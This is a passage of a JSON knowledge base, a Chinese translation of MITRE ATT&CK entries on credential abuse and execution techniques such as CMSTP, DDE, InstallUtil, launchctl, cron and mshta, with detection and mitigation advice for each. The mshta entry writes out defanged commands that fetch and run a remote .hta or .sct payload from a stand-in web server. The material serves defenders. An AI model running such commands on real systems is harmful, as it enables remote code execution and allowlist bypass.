	"description": "<p>攻击者可能会使用凭据访问技术窃取特定用户或服务账号的凭据，或者在侦察过程的早期通过社会工程捕获凭据以获得首次访问权限。</p><p>攻击者可以使用三种账号：默认账号、本地账号和域账号。默认账号是操作系统的内置账号，例如Windows系统上的访客或管理员账号，或者其他类型系统、软件或设备上的默认工厂/提供商账号。本地账号是组织配置给用户、远程支持或服务的账号，或单个系统/服务的管理账号。域账号是AD-DS（活动目录域服务）管理的账号，其访问和权限在域内不同系统和服务之间配置。域账号可以涵盖用户、管理员和服务。</p><p>攻击者可以使用窃取的凭据绕过网络内系统上各种资源的访问控制，甚至可用于对远程系统和外部可用服务（如VPN、Outlook Web Access和远程桌面）的持久访问。攻击者还可能通过窃取的凭据获得特定系统的更多权限或网络受限区域的访问权限。攻击者可以选择不将恶意软件或工具与这些凭据提供的合法访问结合使用，这样就更难检测到它们的存在。</p><p>默认账号并不限于客户端机器上的访客和管理员，它们还包括为设备（如网络设备和计算机应用）预设的账号，无论这些设备是内部的、开源的还是COTS。如果设备预设了用户名和密码组合而且安装后不更改，将会对组织构成严重威胁，因为它们很容易成为攻击者的目标。同理，攻击者也可能会利用公开披露的私钥或盗取的私钥通过远程服务合法地连接到远程环境。</p><p>我们需要关注跨系统网络的账号访问、凭据和权限的重叠，因为攻击者也许能够跨账号和系统切换以获得较高的访问级别（域或企业管理员），从而绕过企业内设置的访问控制。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "AWS", "GCP", "Azure", "SaaS", "Office 365"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["AWS CloudTrail日志", "Stackdriver日志", "认证日志", "进程监控"]
	},
	"relations": {
		"detection": "<p>在整个企业中为外部可访问的服务配置可靠、一致的账号活动审核策略。查看是否有跨系统的可疑的共享账号（用户、管理员或服务账号）行为。例如：一个账号同时登录到多个系统；多个账号同时登录到同一台机器；在反常时间或工作时间以外登录的账号。账号活动可能来自交互式登录会话，也可能来自在远程系统上执行二进制文件的特定帐户的进程。将其他安全系统与登录信息关联（例如，用户有活动的登录会话，但尚未进入建筑物或没有访问VPN）。</p><p>定期审核域账号和本地系统账号来查看是否有攻击者为持久性所创建的账号。账号审核还可以包括检查是否激活了默认账号（如访客）。审核还应包括检查所有设备和应用的默认凭据或SSH密钥。一旦发现，应立即更新。</p>",
		"mitigations": [{
			"name": "应用程序开发人员指南",
			"description": "确保应用程序不会以不安全方式存储敏感数据或凭据（例如，代码中的纯文本凭据，存储库中的已发布凭据，或公共云存储中的凭据）。"
		}, {
			"name": "审核",
			"description": "定期审核源代码、应用程序配置文件、开放存储库以及公共云存储，查看凭据的使用和存储是否安全。"
		}, {
			"name": "网络流量过滤",
			"description": "云服务提供商支持基于IP地址限制云资源的访问。请考虑在云化系统上将IP地址白名单和用户账户管理结合使用，以确保数据访问仅限于预期IP地址范围内的有效用户，从而减少攻击者使用窃取的凭据访问数据的可能。"
		}, {
			"name": "多因子认证",
			"description": "将多因子认证（MFA）纳入组织策略可大大降低攻击者获得有效凭据控制并将凭据用于其他攻击技术（例如初始访问、横向移动和收集信息）的风险。MFA还可以用于限制对云资源和API的访问。"
		}, {
			"name": "密码策略",
			"description": "应用及设备的默认用户名和密码应在安装后和部署到生产环境之前立即更改。如果可能，应该定期更新使用SSH密钥的应用，并对其进行适当的保护。确保本地管理员账号在网络上所有系统中有复杂且唯一的密码。"
		}, {
			"name": "特权账号管理",
			"description": "定期审核域账号和本地账号及他们的权限级别，查看是否有允许攻击者通过获取特权账号凭据从而获得广泛访问权限的情况。这些审核还应包括是否启用了默认账号，或者是否创建了新的未经授权的本地账号。不要将用户或管理域账号放在不同系统的本地管理员组中，除非它们受到严格控制并且是分开使用的，因为这通常相当于这些系统上都有一个相同密码的本地管理员账号。遵循企业网络设计和管理最佳实践，限制跨管理层使用特权账号。限制跨系统的凭据重叠以防止攻击者获取账号凭据用来访问。"
		}, {
			"name": "用户账户管理",
			"description": "通过身份和访问管理（IAM）控制来确保用户和用户组角色有适当权限。另外，还需配置可以访问云化系统的用户权限、组以及角色。实施严格的IAM控制以防止对系统的访问，但需要访问的应用程序、用户和服务除外。请考虑在云环境中使用仅在一定时间内有效的临时凭据，以降低被入侵账户的有效性。"
		}],
		"tactics": ["TA0005", "TA0003", "TA0004", "TA0001"]
	},
	"name": "有效账号"
}, {
	"id": "T1155",
	"description": "<p>MacOS和OS X应用程序相互发送AppleEvent消息以实现进程间通信（IPC）。可以使用AppScript为本地或远程IPC轻松编写这些消息。Osascript可以执行AppScript或其它符合开放脚本架构（OSA）语言的脚本。通过osalang程序可以获取系统安装的OSA语言列表。AppleEvent消息可独立发送或是作为此类脚本的一部分发送。此类事件消息可用于定位打开的窗口，触发按键，并以本地或远程的方式与任何运行中的应用程序交互。</p><p>恶意程序使用该机制可以利用已打开的SSH连接，横向移动到其它机器，甚至给用户展示伪造的对话框。此类事件可以启动本地程序，但不能远程启动位于其它机器的应用程序。不过，它们可以和远程已在运行的程序交互。由于是脚本语言，它可以被利用来启动其它更常见的技术，如通过python的反向shell。在命令行中通过<code>osascript /path/to/script</code>或者<code>osascript -e \"script here\"</code>来运行脚本。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["普通用户"],
		"dataSources": ["API 监控", "系统调用", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控通过osascript执行AppleScript的情况，这可能与系统中其它可疑行为相关。</p>",
		"mitigations": [{
			"name": "代码签名",
			"description": "要求所有的AppleScript在执行前都要被可信的开发者ID签名，这可以阻止无签名的AppleScript执行。此举措和Gatekeeper审查.app文件的目的类似。"
		}],
		"tactics": ["TA0002", "TA0008"]
	},
	"name": "AppScript"
}, {
	"id": "T1191",
	"description": "<p>微软的命令行程序CMSTP.exe用于安装连接管理器服务配置文件。CMSTP.exe将收到的安装信息文件（INF）作为参数，安装用于远程访问连接的服务配置文件。</p><p>攻击者可能会向CMSTP.exe提供带恶意命令的INF文件。与Regsvr32/\"Squiblydoo\"类似，CMSTP.exe可能被滥用来从远程服务器加载和执行动态链接库和/或COM脚本小程序。攻击者还可能用CMSTP.exe来绕过AppLocker及其他白名单防御，因为CMSTP.exe本身是一个合法的、已签名的微软应用。</p><p>CMSTP.exe也可能被滥用来绕过用户账号控制并通过自动升级的COM接口执行INF文件中的任意恶意命令。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数", "网络进程使用", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>通过进程监控来检测和分析CMSTP.exe的执行和参数。对比CMSTP.exe的近期调用与历史已知合法参数及已加载文件来确定是否有异常和潜在的攻击活动。</p><p>可通过Sysmon事件来查看是否有CMSTP.exe的滥用情况。检测策略可能取决于具体的攻击程序。规则如下：</p><p>·         检测本地/远程有效负载的加载和执行—事件1（进程创建）和/或事件3（网络连接）。事件1中，ParentImage包含CMSTP.exe；事件3中，Image包含CMSTP.exe，DestinationIP是外部的。</p><p>·         通过自动升级的COM接口检测用户账号控制绕过行为—事件10（ProcessAccess）和/或事件12或13（RegistryEvent）。事件10中，CallTrace包含CMLUA.dll。事件12或13中，TargetObject包含CMMGR32.exe。另外还监控事件，例如进程创建事件（Sysmon事件1），此事件涉及自动升级的CMSTP COM接口，如CMSTPLUA（3E5FC7F9-9A51-4367-9063-A120244FBEC7）和CMLUAUTIL（3E000D72-A845-4CD9-BD83-80C07C3B881F）。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "在给定环境中可能不需要CMSTP.exe（除非用其安装VPN连接）。"
		}, {
			"name": "执行预防",
			"description": "如果给定系统或网络不需要CMSTP.exe，则考虑使用应用白名单来阻止其执行，以防止其被攻击者滥用。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "CMSTP"
}, {
	"id": "T1059",
	"description": "<p>命令行界面是与计算机系统交互的一种方式，并且是很多操作系统平台的常见特性。例如，Windows系统上的命令行界面cmd可用于执行许多任务，包括执行其他软件。命令行界面可在本地交互或者通过远程桌面应用、反向shell会话等远程交互。执行的命令以命令行界面进程的当前权限级别运行，除非该命令需要调用进程来更改权限上下文（例如，定时任务）。</p><p>攻击者可能会使用命令行界面与系统交互并在操作过程中执行其他软件。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>可以适当记录进程执行日志信息（包括命令行参数信息）来捕获命令行界面活动。这些信息可能有助于获取攻击者活动相关的其它信息，了解攻击者如何使用进程或自定义工具。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "在适当的情况下，使用应用白名单工具（如Windows Defender Application Control，AppLocker或软件限制策略）来审核和/或阻止不必要的命令行解释程序。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "命令行界面"
}, {
	"id": "T1223",
	"description": "<p>编译过的HTML文件（.chm）通常作为微软帮助文档分发。CHM文件通常压缩编译了多种文件，如HTML文档、图片以及程序脚本如VBA、JScript、Java、ActiveX。CHM的内容通过HTML帮助程序（hh.exe）调用IE浏览器的底层组件显示。</p><p>攻击者可能会利用这一技术隐藏恶意代码。将嵌有有效负载的自定义CHM文件交付给受害者，然后通过用户执行触发。CHM执行克绕过旧系统和/或未打补丁系统上的应用白名单机制，因为这些系统未将通过hh.exe加载执行的应用程序加入应用白名单的审计。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控并分析hh.exe的执行以及它的参数。对比hh.exe的近期调用与历史已知合法参数来确定是否有异常和潜在的恶意活动（如：混淆的以及恶意的命令）。非标准的进程调用树也意味着有嫌疑或恶意的行为，比如hh.exe是某些恶意进程的父进程，或是一些活动是已知的恶意行为。监控CHM文件的状态及使用情况，特别是当它们不是环境中的常见文件时要尤其当心。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "如果给定系统或网络不需要hh.exe，考虑使用应用白名单来阻止其执行，以防其被攻击者滥用。"
		}, {
			"name": "Web内容限制",
			"description": "考虑禁止下载/传输以及执行一些不常见的文件类型如CHM，此类文件已知会被一些恶意程序利用。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "HTML编译文件"
}, {
	"id": "T1196",
	"description": "<p>Windows控制面板项目允许用户查看和调整计算机设置。控制面板项目是已注册的可执行（.exe）或控制面板（.cpl）文件，后者实际上是重命名的动态链接库（.dll）文件，用于导出CPlApplet函数。控制面板项目可以直接从命令行执行，通过调用API（应用程序编程接口）以编程方式执行，或者只需双击文件即可执行。</p><p>为了便于使用，控制面板项目通常包括已注册和加载到控制面板、用户可用的图形菜单。</p><p>攻击者可以将控制面板项目用作有效负载来执行任意命令。他们可以通过鱼叉式钓鱼攻击附件提供恶意控制面板项目，也可以将它们作为多级恶意软件的一部分执行。控制面板项目，尤其是CPL文件，也可能绕过应用和/或文件扩展名白名单。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["API监控", "二进制文件元数据", "动态链接库监控", "Windows注册表", "Windows事件日志", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控和分析CPL文件相关项目的活动，例如Windows控制面板进程二进制文件（control.exe）以及shell32.dll中的Control_RunDLL和ControlRunDLLAsUser API函数。当从命令行执行或单击时，control.exe将在Rundll32调用CPL的API函数（例如，<code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>）之前执行CPL文件（例如，<code>control.exefile.cpl</code>）。可以通过CPL API函数直接执行CPL文件，只需使用后一个Rundll32命令，该命令可以绕过对control.exe的检测和/或执行过滤。</p><p>创建控制面板项目清单，用于定位系统上未注册和可能的恶意文件：</p><p>·         可执行格式、已注册的控制面板项目在<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace</code>和<code>HKEY_CLASSES_ROOT\\CLSID{{GUID}}</code>中有GUID（全局唯一标识符）和注册表项。这些注册表项可能包含控制面板项目信息，例如其显示名称，本地文件路径以及在控制面板中打开时执行的命令。</p><p>·         控制面板自动显示存储在System32目录中的CPL格式、已注册的控制面板项目。其他控制面板项目在<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\ControlPanel</code>的<code>Cpls</code> 和<code>ExtendedProperties</code> 注册表项中有注册条目。这些条目可能包括GUID，本地文件路径以及规范名称等信息。规范名称用于以编程方式（<code>WinExec(\"c:\\windows\\system32\\control.exe{{Canonical_Name}}\", SW_NORMAL);</code>）或命令行方式（<code>control.exe /name{{Canonical_Name}}</code>）启动文件。</p><p>·         某些控制面板项目可通过<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\ControlsFolder{{name}}\\Shellex\\PropertySheetHandlers</code>中注册的Shell扩展进行扩展，其中{{name}}是系统项的预定义名称。</p><p>分析新的控制面板项目以及磁盘上的恶意内容相关项目。可执行和CPL格式都是兼容的PE（可移植可执行）图像，可以使用传统工具和方法进行检查，待定的反逆向工程技术。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "在适当的情况下，使用应用白名单工具（如Windows Defender Application Control，AppLocker或软件限制策略）来识别并阻止可能的恶意及未知.cpl文件。"
		}, {
			"name": "文件和目录权限限制",
			"description": "将控制面板项目的存储和执行限定给受保护的目录，例如C:\\Windows，而不是用户目录。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "控制面板项目"
}, {
	"id": "T1173",
	"description": "<p>Windows动态数据交换（DDE）是一种用于一次性或持续进程间通信（IPC）的客户端-服务器协议。一旦建立了连接，应用可以匿名交换包括字符串、温数据链接（数据项变化时的通知）、热数据链接（数据项变化的副本）以及命令执行请求在内的事务信息。</p><p>对象链接与嵌入（OLE），或者说不同文档中数据的链接能力，原本是通过DDE实现的。虽说正在被COM取代，DDE可能在Windows10和大多数微软Office 2016中通过注册表项启用。</p><p>攻击者可能会通过DDE执行任意命令，直接或以嵌入文件的方式污染Office文档，然后以钓鱼活动或他们所控制的web内容而不是使用VBA宏来执行恶意代码。攻击者也可能会通过DDE操控那些已攻破但无法直接执行命令的机器。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["普通用户"],
		"dataSources": ["API监控", "DLL监控", "进程监控", "Windows 注册表", "Windows 事件日志"]
	},
	"relations": {
		"detection": "<p>在OLE和Office开放的XML文件中扫描DDEAUTO、DDE以及其它表示DDE执行的关键字符串。</p><p>监控Microsoft Office应用程序，查看其是否加载了通常与程序无关的动态链接库及其它模块。</p><p>监控Microsoft Office应用程序，查看其是否创建了非寻常进程（如cmd.exe）。</p>",
		"mitigations": [{
			"name": "应用隔离和沙箱",
			"description": "确保已启用Protected View。"
		}, {
			"name": "终端行为防护",
			"description": "在Windows10上，启用攻击平面削减（ASR）规则以防止DDE攻击以及通过Office程序创建子进程的行为。"
		}, {
			"name": "特性/程序禁用或删除",
			"description": "可以设置控制微软Office安全特性的注册表项以禁用自动执行DDE/OLE。微软同时创建并默认开启了在Word和Excel软件中完全禁用DDE执行的注册表项。"
		}, {
			"name": "软件配置",
			"description": "考虑在一些Office程序中禁用嵌入文件，比如像OneNote那样样不支持保护视图的软件。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "动态数据交换"
}, {
	"id": "T1106",
	"description": "<p>攻击者工具可能直接使用Windows API来执行二进制文件。Windows API CreateProcess等函数将允许程序和脚本使用正确的路径和参数启动其他进程。</p><p>其它可调用来执行二进制文件的Windows API函数包括：</p><p>·         CreateProcessA()和CreateProcessW(),</p><p>·         CreateProcessAsUserA()和CreateProcessAsUserW(),</p><p>·         CreateProcessInternalA()和CreateProcessInternalW(),</p><p>·         CreateProcessWithLogonW()和CreateProcessWithTokenW(),</p><p>·         LoadLibraryA()和LoadLibraryW(),</p><p>·         LoadLibraryExA()和LoadLibraryExW(),</p><p>·         LoadModule(),</p><p>·         LoadPackagedLibrary(),</p><p>·         WinExec(),</p><p>·         ShellExecuteA()和ShellExecuteW(),</p><p>·         ShellExecuteExA()和ShellExecuteExW()</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["API监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控API调用可能会生成大量数据。除非在特定情况下，否则可能无法直接用于防御，因为Windows API函数（如CreateProcess）的使用通常都是善意的，难以与恶意行为区分开来。将其他事件与通过API监控发现的API函数调用行为相关联可为事件提供额外的上下文，这可以帮助确定事件是否因恶意行为而产生。按进程沿袭（按进程ID）对活动进行关联可能就足够了。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "在适当的情况下，使用应用白名单工具（如Windows Defender Application Control，AppLocker或软件限制策略）来识别并阻止可能通过此技术执行的潜在恶意软件。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "通过API接口执行"
}, {
	"id": "T1129",
	"description": "<p>可以指示Windows模块加载程序从任意本地路径和任意UNC（通用命名规则）网络路径加载动态链接库。此功能位于NTDLL.dll中，是Windows 原生 API的一部分。Windows 原生 API从Win32 API的CreateProcess（），LoadLibrary（）等函数中调用。</p><p>模块加载器可以通过以下方式加载动态链接库：</p><p>·         在IMPORT目录中指定动态链接库路径名（完全限定或相对）；</p><p>·         Forward EXPORT到其它有指定路径名（完全限定或相对，但没有扩展名）的动态链接库；</p><p>·         使用带某目录完全限定或相对路径名的NTFS连接或符号链接program.exe.local，此目录包含IMPORT目录中指定的动态链接库或forward EXPORT；</p><p>·         使用内置或外部“应用清单”中的<code>&lt;filename=\"filename.extension\" loadFrom=\"fully-qualified or relativepathname\"&gt;</code>。其中，filename是指IMPORT目录中的条目或forward EXPORT。</p><p>攻击者可能会使用此功能在系统上执行任意代码。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["API监控", "动态链接库监控", "文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控动态链接库模块加载可能会生成大量数据。除非在特定情况下，否则可能无法直接用于防御，因为Windows模块加载函数的使用通常是善意的，难以与恶意行为区分开来。合法软件可能只需要加载例程，绑定的动态链接库模块或Windows系统动态链接库。加载有偏差的话是可疑的。限定动态链接库模块加载到%SystemRoot%和%ProgramFiles%目录可防止从不安全路径加载模块。</p><p>将其他事件与通过API监控发现的模块加载行为以及可疑动态链接库写入磁盘的行为相关联将为事件提供额外的上下文，这可以帮助确定事件是否因恶意行为而产生。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "使用能够防止加载未知动态链接库的应用白名单工具来识别并阻止通过此技术执行的潜在恶意软件。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "通过模块加载执行"
}, {
	"id": "T1203",
	"description": "<p>由于会导致意外行为的不安全编码实践，软件中可能存在漏洞。攻击者可以针对性地利用某些漏洞来达到执行任意代码的目的。对攻击性工具包来说最有利用价值的通常是那些可利用来在远程系统上执行代码的漏洞，因为利用这些漏洞可以访问该系统。用户将期望看到与他们工作中常用应用相关的文件。由于这些文件具有很高的实用性，常用于漏洞攻击研究和开发。</p><p>本节描述以下几种利用方式。</p><p>浏览器利用</p><p>Web浏览器是网页木马攻陷和鱼叉式钓鱼攻击链接的共同目标。攻击者可能会在用户正常浏览网络或遭受鱼叉式钓鱼攻击时入侵端点系统。遭受带链接的鱼叉式钓鱼攻击时，用户被邮件中的链接定向到攻击者控制的、用来利用web浏览器的网站。通常，攻击者不需要用户执行什么操作就能达到攻击目的。</p><p>办公应用利用</p><p>针对Microsoft Office等常见办公和生产力应用，攻击者也是通过附件、链接、服务的形式来实施鱼叉式钓鱼攻击。攻击者把恶意文件以附件或链接形式直接传送给目标用户，诱使用户下载它们。在这过程中，攻击者需要用户打开文档或文件才能达到攻击目的。</p><p>常见第三方应用利用</p><p>攻击者也可以使用其他常见应用或目标网络中部署的软件应用来实施攻击。企业环境中的常见应用，比如Adobe Reader和Flash，一直是攻击者企图利用来访问系统的目标。软件和漏洞本身的性质可能需要某些漏洞在浏览器中利用，或需要用户打开文件。例如，某些Flash漏洞利用已作为对象在Microsoft Office文档中传递。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"dataSources": ["杀毒软件", "系统调用", "进程监控"]
	},
	"relations": {
		"detection": "<p>软件利用检测可能很困难，具体取决于可用的工具。还要在端点系统上查找能表明攻击成功的行为，例如浏览器或Office进程的异常行为，包括写入磁盘的可疑文件，通过进程插入来试图掩盖执行的证据，发现的证据，以及表明有其它工具传输到系统的异常网络流量。</p>",
		"mitigations": [{
			"name": "应用隔离和沙箱",
			"description": "可用浏览器沙箱来缓解漏洞攻击的一些影响，但可能会有沙箱逃逸。也可通过其他类型的虚拟化和应用微分区来缓解客户端漏洞攻击的影响。这些系统中仍然可能存在其它漏洞和缺陷等风险。"
		}, {
			"name": "漏洞利用防护",
			"description": "可用安全应用，比如WDEG（Windows Defender Exploit Guard）和EMET（Enhanced Mitigation Experience Toolkit），来查找漏洞攻击行为，从而缓解某些漏洞攻击行为的影响。也可通过控制流完整性检查来识别和阻止软件攻击。许多保护措施依赖于体系结构和目标应用二进制文件的兼容性。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "客户端执行利用"
}, {
	"id": "T1061",
	"description": "<p>图形用户界面（GUI）是与系统交互的常见方式。攻击者可能会在操作过程中通过远程交互式会话（如远程桌面协议）而非命令行来使用系统的GUI，从而在鼠标双击事件、Windows运行命令或其他难以监控的交互中搜索信息和执行文件。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["普通用户", "管理员", "系统权限"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数", "二进制文件的元信息"]
	},
	"relations": {
		"detection": "<p>检测通过GUI的执行可能会导致大量的误报。应考虑使用其它因素检测是否有攻击者滥用服务，通过远程交互会话获取系统访问权限。</p><p>在远程会话中超出普通行为以外的未知或不寻常进程创建是可疑的。收集并审计安全日志，查看是否有远程系统访问日志或是基于合法凭据的远程系统访问日志。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "图形用户界面"
}, {
	"id": "T1118",
	"description": "<p>命令行实用程序InstallUtil可用于通过执行.NET二进制文件中指定的特定安装程序组件来安装和卸载资源。InstallUtil位于Windows系统上的.NET目录中：<code>C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe</code>。InstallUtil.exe由Microsoft进行数字签名。</p><p>攻击者可能会使用InstallUtil通过受信任的Windows实用程序来代理执行代码。攻击者还可以用Installutil来绕过进程白名单，方法是在二进制文件中使用属性，这些属性执行用属性<code>[System.ComponentModel.RunInstaller(true)]</code>修饰的类。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>通过进程监控来检测和分析InstallUtil.exe的执行和参数。比较InstallUtil.exe的近期调用与历史已知合法参数及已加载文件来确定是否有异常和潜在的攻击活动。在InstallUtil.exe调用之前和之后使用的命令参数也可用于确定正在执行的二进制文件的来源和目的。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "在给定环境中可能不需要InstallUtil。"
		}, {
			"name": "执行预防",
			"description": "如果给定系统或网络不需要InstallUtil.exe，则使用应用白名单来阻止其执行，以防止其被攻击者滥用。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "InstallUtil工具"
}, {
	"id": "T1152",
	"description": "<p>Launchctl用于控制macOS上启动代理和启动服务的加载进程，但是它自身也可执行其它命令或程序。Launchctl支持在命令行中使用子命令，以交互方式运行甚至直接从标准输入重定向。攻击者可能会通过加载或重加载要启动的代理和服务来做系统修改并持久化。通过Launchctl执行命令就像执行<code>launchctl submit -l-- /Path/to/thing/to/execute \"arg\"\"arg\" \"arg\"</code>一样简单。加载、卸载、或重新加载要启动的代理或服务可能需要提权。</p><p>攻击者可能会滥用该功能以执行代码，甚至当launchctl属于白名单项时通过它执行程序可绕过系统的白名单校验机制。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["User", "Administrator"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>使用Knock Knock检测持久化程序，例如通过launchctl作为启动代理或启动守护程序安装的程序。另外，每个启动代理或启动服务在磁盘上都有可被监控的plist文件。监控launchctl/launchd进程执行，查看是否有异常或未知进程。</p>",
		"mitigations": [{
			"name": "用户账户管理",
			"description": "禁止用户安装他们自己的启动代理和启动服务，要求他们遵循组策略。"
		}],
		"tactics": ["TA0005", "TA0002", "TA0003"]
	},
	"name": "Launchctl工具"
}, {
	"id": "T1168",
	"description": "<p>在Linux和macOS操作系统中，有很多方法支持创建计划和周期性后台任务：cron，at和launchd。与Windows操作系统的计划任务不同，基于Linux操作系统中的任务调度默认无法远程执行，除非与建立的远程会话结合使用，比如：安全的shell（SSH）。</p><p>cron</p><p>系统级cron任务可通过修改<code>/etc/crontab</code>文件，<code>/etc/cron.d/</code>目录或者cron后台程序支持的其它位置来安装；用户级cron任务可通过crontab使用特定格式化的crontab文件来安装。</p><p>这些方式允许命令或者脚本以特定、周期性间隔在后台执行，无需用户交互。攻击者可能会在系统启动时或者按照计划通过任务调度执行程序来获得持久化，进而执行横向移动，从而获取root权限或者特定账号上下文下运行进程。</p><p>at</p><p>在基于POSIX的系统（包括macOS和Linux）中，at程序是程序或脚本任务调度执行的另一种方式，同样也能达到相同的目的。</p><p>launchd</p><p>类似于启动服务或启动代理，每个launchd任务通过不同的配置属性列表（plist）来描述，只是有个额外的带有时间属性字典的StartCalendarInterval键。这种方式仅用于macOS和OS X。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["管理员", "用户", "root用户"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>合法的计划任务可能会在新软件安装时或通过管理功能来创建。可通过相应工具列举任务详情来监控这些launched和cron计划任务。可通过监控launched和cron任务相关进程的执行来查找异常或者未知应用和行为。</p>",
		"mitigations": [{
			"name": "用户账户管理",
			"description": "限制用户使用组策略创建启动代理的能力。"
		}],
		"tactics": ["TA0003", "TA0002"]
	},
	"name": "本地作业调度"
}, {
	"id": "T1177",
	"description": "<p>Windows安全子系统是用来管理和执行计算机或者域相关安全策略的一套组件。本地安全认证（LSA）是负责本地安全策略和用户鉴权的主要组件。LSA包含多种其它安全方法相关的动态链接库，这些动态链接库（DLL）都在LSA子系统服务lsass.exe进程上下文中执行。</p><p>攻击者可能会把lsass.exe驱动程序作为目标，用来获取执行或者持久化权限。他们会替换或者添加非法驱动程序（如：DLL侧载或者DLL搜索顺序劫持），通过持续的LSA操作来触发任意代码执行。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "动态链接库监控", "文件监控", "内核驱动", "加载的动态链接库", "进程监控"]
	},
	"relations": {
		"detection": "<p>在启用LSA保护的情况下，监控事件日志（事件3033和3063），查看是否有LSA插件和驱动程序加载失败相关日志。</p><p>利用系统内置的Autoruns/Autorunsc工具来检查已经加载的与LSA相关的驱动程序。</p><p>利用系统内置的进程监控工具来监控lsass.exe加载DLL的相关操作。</p>",
		"mitigations": [{
			"name": "代码签名",
			"description": "在Windows 8.1和Server 2012 R2版本，将注册表项HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL设置为dword:00000001来启用LSA保护。LSA保护可确保LSA插件以及驱动程序只会被经过微软数字签名的软件加载，同时坚持微软安全开发生命周期流程指南。"
		}, {
			"name": "凭据访问保护",
			"description": "在Windows 10和Server 2016上，启用Windows防御凭据守护，从而让lsass.exe运行在没有任何设备驱动程序的隔离虚拟环境中。"
		}, {
			"name": "限制库装载",
			"description": "设置HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode，确保启用安全DLL搜索模式，从而减少lsass.exe加载恶意代码库的风险。"
		}],
		"tactics": ["TA0002", "TA0003"]
	},
	"name": "LSASS驱动程序"
}, {
	"id": "T1170",
	"description": "<p>Mshta.exe是一个执行微软HTA（HTML应用）的实用程序。HTA文件扩展名为.hta。HTA是独立的应用，使用与InternetExplorer相同的模型和技术来执行，但在浏览器之外执行。</p><p>攻击者可能会使用mshta.exe通过受信任的Windows实用程序来代理执行恶意.hta文件和Javascript或VBScript。已知攻击者在最初攻击阶段利用mshta.exe来执行代码的几个例子。</p><p>Mshta.exe可通过内联脚本来执行文件：<code>mshtavbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code></p><p>也可以直接从URL执行：<code>mshta http[:]//webserver/payload[.]hta</code></p><p>Mshta.exe可绕过不考虑其潜在用途的应用白名单解决方案。由于mshta.exe在InternetExplorer的安全上下文之外执行，因此它还会绕过浏览器安全设置。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>通过进程监控来检测和分析mshta.exe的执行和参数。查找在命令行中执行原始或混淆脚本的mshta.exe。比较mshta.exe的近期调用与历史已知合法参数及已执行二进制文件来确定是否有异常和潜在的攻击活动。在mshta.exe调用之前和之后使用的命令参数也可用于确定正在执行的二进制文件的来源和目的。</p><p>监控HTA文件的使用。在环境中执行不经常使用的HTA文件是可疑的。</p>",
		"mitigations": [{
